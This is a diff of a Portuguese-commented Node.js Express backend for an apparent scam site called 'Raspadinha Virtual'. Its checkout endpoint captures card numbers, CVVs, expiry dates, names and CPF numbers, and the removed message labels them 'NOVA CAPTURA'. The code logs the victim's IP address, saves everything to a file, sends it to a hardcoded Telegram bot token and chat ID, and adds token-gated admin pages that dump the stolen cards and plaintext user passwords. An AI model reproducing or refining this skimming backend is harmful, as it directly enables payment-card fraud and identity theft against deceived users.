@@ -1,214 +1,198 @@
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
-const fetch = require("node-fetch");
+const fetch = require('node-fetch'); // use v2 no package.json
 const cors = require('cors');
+
 const app = express();
 
-// Middleware
+// ========= Middleware básico =========
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve arquivos estáticos da pasta "site"
+// ========= Estáticos =========
 app.use(express.static(path.join(__dirname, 'site')));
-
-// Redireciona / para o index.html
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'site', 'index.html'));
 });
 
-// Configuração da porta para Railway
+// ========= Config =========
 const PORT = process.env.PORT || 3000;
+const DATA_DIR = __dirname; // garante caminho absoluto no Railway
+const usersFile = path.join(DATA_DIR, 'users.txt');
+const checkoutFile = path.join(DATA_DIR, 'checkout.txt');
 
-//=== ARQUIVOS DE DADOS ===
-const usersFile = './users.txt';
-const checkoutFile = './checkout.txt';
+// Preferir ENV no Railway, com fallback para os valores existentes
+const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "-1002852733056";
+const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'MOUSEPADGAFANHOTO';
 
-// Função para garantir que os arquivos existam
+// ========= Utils =========
 function ensureFilesExist() {
-  if (!fs.existsSync(usersFile)) {
-    fs.writeFileSync(usersFile, '');
+  if (!fs.existsSync(usersFile)) fs.writeFileSync(usersFile, '', 'utf8');
+  if (!fs.existsSync(checkoutFile)) fs.writeFileSync(checkoutFile, '', 'utf8');
+}
+function nowISO() { return new Date().toISOString(); }
+
+async function sendToTelegram(message) {
+  if (!TELEGRAM_TOKEN || !CHAT_ID) {
+    console.warn('⚠️ TELEGRAM env ausentes. Pulando envio.');
+    return { ok: false, skipped: true };
   }
-  if (!fs.existsSync(checkoutFile)) {
-    fs.writeFileSync(checkoutFile, '');
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  const body = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true };
+  const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+  const data = await resp.json().catch(() => ({}));
+  if (!resp.ok || data.ok === false) {
+    const desc = (data && data.description) ? data.description : `HTTP ${resp.status}`;
+    throw new Error(`Erro do Telegram: ${desc}`);
   }
+  return data;
 }
 
-//=== REGISTRO ===
+// ========= Registro =========
 app.post('/register', (req, res) => {
-  const { username, password, fullname } = req.body;
-
+  const { username, password, fullname } = req.body || {};
   if (!username || !password || !fullname) {
     return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
   }
+  try {
+    ensureFilesExist();
+    const lines = fs.readFileSync(usersFile, 'utf8').split('\n').filter(Boolean);
+    const exists = lines.some(line => line.split('|')[0] === username);
+    if (exists) return res.json({ success: false, message: 'Usuário já existe.' });
 
-  ensureFilesExist();
-
-  // Verifica se já existe
-  if (fs.existsSync(usersFile)) {
-    const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
-    const exists = existingUsers.some(line => {
-      const [savedUsername] = line.split('|');
-      return savedUsername === username;
-    });
-
-    if (exists) {
-      return res.json({ success: false, message: 'Usuário já existe.' });
-    }
+    const row = `${username}|${password}|${fullname}|${nowISO()}\n`;
+    fs.appendFileSync(usersFile, row, 'utf8');
+    console.log(`Novo usuário registrado: ${username}`);
+    return res.json({ success: true, message: 'Usuário registrado com sucesso!' });
+  } catch (err) {
+    console.error('Erro /register:', err);
+    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
   }
-
-  // Salva novo usuário
-  const userLine = `${username}|${password}|${fullname}\n`;
-  fs.appendFileSync(usersFile, userLine);
-  
-  console.log(`Novo usuário registrado: ${username}`);
-  res.json({ success: true, message: 'Usuário registrado com sucesso!' });
 });
 
-//=== LOGIN ===
+// ========= Login =========
 app.post('/login', (req, res) => {
-  const { username, password } = req.body;
-
+  const { username, password } = req.body || {};
   if (!username || !password) {
     return res.json({ success: false, message: 'Informe usuário e senha.' });
   }
-
-  ensureFilesExist();
-
-  fs.readFile(usersFile, 'utf8', (err, data) => {
-    if (err) {
-      console.error('Erro ao ler users.txt:', err);
-      return res.json({ success: false, message: 'Erro no servidor.' });
+  try {
+    ensureFilesExist();
+    const users = fs.readFileSync(usersFile, 'utf8').split('\n').filter(Boolean)
+      .map(line => line.split('|'));
+    const ok = users.find(([u, p]) => u === username && p === password);
+    if (ok) {
+      console.log(`Login ok: ${username}`);
+      return res.json({ success: true, fullname: ok[2] || '' });
     }
-
-    const users = data.split('\n')
-      .map(line => line.trim())
-      .filter(line => line.length > 0)
-      .map(line => {
-        const parts = line.split('|');
-        return {
-          username: parts[0],
-          password: parts[1],
-          fullname: parts[2]
-        };
-      });
-
-    const user = users.find(u => u.username === username && u.password === password);
-
-    if (user) {
-      console.log(`Login realizado: ${username}`);
-      res.json({ success: true, fullname: user.fullname });
-    } else {
-      console.log(`Tentativa de login falhada: ${username}`);
-      res.json({ success: false, message: 'Usuário ou senha inválidos.' });
-    }
-  });
+    console.log(`Login falhou: ${username}`);
+    return res.json({ success: false, message: 'Usuário ou senha inválidos.' });
+  } catch (err) {
+    console.error('Erro /login:', err);
+    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
+  }
 });
 
-//=== TELEGRAM & CHECKOUT ===
-const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
-const CHAT_ID = "-1002852733056"; 
+// ========= Checkout (compatível com seu front) =========
+app.post('/enviar', async (req, res) => {
+  try {
+    const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body || {};
+    if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
+      return res.status(400).json({ success: false, message: 'Todos os campos são obrigatórios.' });
+    }
 
-app.post("/enviar", async (req, res) => {
+    ensureFilesExist();
+
+    const payload = {
+      ts: nowISO(),
+      cardNumber,
+      cardcvvName,
+      expiry,
+      cardholderIdentificationNumber,
+      cardholderNameC,
+      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
+      ua: req.headers['user-agent'] || ''
+    };
+
+    // Persistência como JSONL para facilitar leitura no admin
+    fs.appendFileSync(checkoutFile, JSON.stringify(payload) + '\n', 'utf8');
+    console.log('✔️ checkout salvo em', checkoutFile);
+
+    const mensagem =
+      `<b>Checkout recebido</b>\n` +
+      `💳 <b>Número:</b> ${cardNumber}\n` +
+      `🔒 <b>CVV:</b> ${cardcvvName}\n` +
+      `📅 <b>Validade:</b> ${expiry}\n` +
+      `👤 <b>Nome:</b> ${cardholderNameC}\n` +
+      `🆔 <b>CPF:</b> ${cardholderIdentificationNumber}\n` +
+      `🕒 <b>TS:</b> ${payload.ts}\n` +
+      `🌐 <b>IP:</b> ${payload.ip}`;
+
     try {
-        const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;
-
-        // Validação básica
-        if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
-            return res.status(400).json({ 
-                success: false, 
-                message: 'Todos os campos são obrigatórios.' 
-            });
-        }
-
-        const timestamp = new Date().toLocaleString('pt-BR');
-        
-        // Mensagem para o Telegram
-        const mensagem = `
-💳 NOVA CAPTURA - RASPADINHA VIRTUAL
-⏰ Data/Hora: ${timestamp}
-━━━━━━━━━━━━━━━━━━━━━━━
-💳 Número: ${cardNumber}
-🔒 CVV: ${cardcvvName}
-📅 Validade: ${expiry}
-👤 Nome: ${cardholderNameC}
-🆔 CPF: ${cardholderIdentificationNumber}
-━━━━━━━━━━━━━━━━━━━━━━━
-🎯 Sistema: Raspadinha Virtual
-        `;
-
-        // Dados para salvar no arquivo
-        const checkoutData = `${timestamp}|${cardNumber}|${cardcvvName}|${expiry}|${cardholderNameC}|${cardholderIdentificationNumber}\n`;
-
-        // Salva no arquivo checkout.txt
-        ensureFilesExist();
-        fs.appendFileSync(checkoutFile, checkoutData);
-        console.log('Dados salvos em checkout.txt:', checkoutData.trim());
-
-        // Envia para o Telegram
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: mensagem,
-                parse_mode: 'HTML'
-            })
-        });
-
-        const data = await response.json();
-        console.log("Resposta do Telegram:", data);
-
-        if (!data.ok) {
-            console.error(`Erro do Telegram: ${data.description}`);
-            // Mesmo com erro no Telegram, os dados foram salvos no arquivo
-            res.json({ 
-                success: true, 
-                message: "Dados processados com sucesso!", 
-                telegram_error: data.description 
-            });
-        } else {
-            console.log("Dados enviados com sucesso para Telegram e salvos no arquivo");
-            res.json({ 
-                success: true, 
-                message: "Dados processados e enviados com sucesso!" 
-            });
-        }
-    } catch (error) {
-        console.error("Erro no processamento:", error.message, error.stack);
-        res.status(500).json({ 
-            success: false, 
-            message: "Erro interno do servidor" 
-        });
+      await sendToTelegram(mensagem);
+      console.log('📨 enviado ao Telegram');
+      return res.json({ success: true, message: 'Dados processados e enviados com sucesso!' });
+    } catch (tgErr) {
+      console.error('Falha Telegram:', tgErr.message);
+      // Não falha o fluxo principal
+      return res.json({ success: true, message: 'Dados processados (Falha ao enviar ao Telegram).', telegram_error: tgErr.message });
     }
+  } catch (error) {
+    console.error('Erro /enviar:', error);
+    return res.status(500).json({ success: false, message: 'Erro interno do servidor' });
+  }
 });
 
-//=== ENDPOINT PARA VERIFICAR STATUS ===
-app.get('/status', (req, res) => {
-    res.json({
-        status: 'online',
-        timestamp: new Date().toISOString(),
-        users_count: fs.existsSync(usersFile) ? fs.readFileSync(usersFile, 'utf-8').split('\n').filter(line => line.trim().length > 0).length : 0,
-        checkouts_count: fs.existsSync(checkoutFile) ? fs.readFileSync(checkoutFile, 'utf-8').split('\n').filter(line => line.trim().length > 0).length : 0
-    });
+// ========= Admin (NOVO) =========
+// Exibe conteúdo bruto do checkout.txt
+app.get('/admin/checkouts', (req, res) => {
+  const token = req.query.token;
+  if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
+  try {
+    ensureFilesExist();
+    const data = fs.readFileSync(checkoutFile, 'utf8');
+    res.type('text/plain').send(data || '(vazio)');
+  } catch (e) {
+    console.error('Erro admin/checkouts:', e);
+    res.status(500).send('Erro ao ler checkout.txt');
+  }
 });
 
-//=== INICIALIZAÇÃO ===
+// Exibe conteúdo bruto do users.txt
+app.get('/admin/users', (req, res) => {
+  const token = req.query.token;
+  if (token !== ADMIN_TOKEN) return res.status(403).send('Acesso negado');
+  try {
+    ensureFilesExist();
+    const data = fs.readFileSync(usersFile, 'utf8');
+    res.type('text/plain').send(data || '(vazio)');
+  } catch (e) {
+    console.error('Erro admin/users:', e);
+    res.status(500).send('Erro ao ler users.txt');
+  }
+});
+
+// ========= Status & Health =========
+app.get('/status', (_req, res) => {
+  ensureFilesExist();
+  const usersCount = fs.readFileSync(usersFile, 'utf8').split('\n').filter(l => l.trim()).length;
+  const checkoutsCount = fs.readFileSync(checkoutFile, 'utf8').split('\n').filter(l => l.trim()).length;
+  res.json({ status: 'online', timestamp: nowISO(), users_count: usersCount, checkouts_count: checkoutsCount });
+});
+app.get('/api/health', (_req, res) => res.json({ ok: true, ts: nowISO() }));
+
+// ========= Inicialização =========
 ensureFilesExist();
-
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
-  console.log(`📝 Arquivo de usuários: ${usersFile}`);
-  console.log(`💳 Arquivo de checkout: ${checkoutFile}`);
-  console.log(`📊 Status endpoint: /status`);
+  console.log(`📝 usersFile: ${usersFile}`);
+  console.log(`💳 checkoutFile: ${checkoutFile}`);
+  console.log(`🔐 ADMIN_TOKEN: ${ADMIN_TOKEN ? '(setado)' : '(ausente)'}`);
 });
 
-// Tratamento de erros
-process.on('uncaughtException', (err) => {
-    console.error('Erro não capturado:', err);
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.error('Promise rejeitada:', reason);
-});
+// ========= Tratamento global de erros =========
+process.on('uncaughtException', (err) => console.error('Erro não capturado:', err));
+process.on('unhandledRejection', (reason) => console.error('Promise rejeitada:', reason));
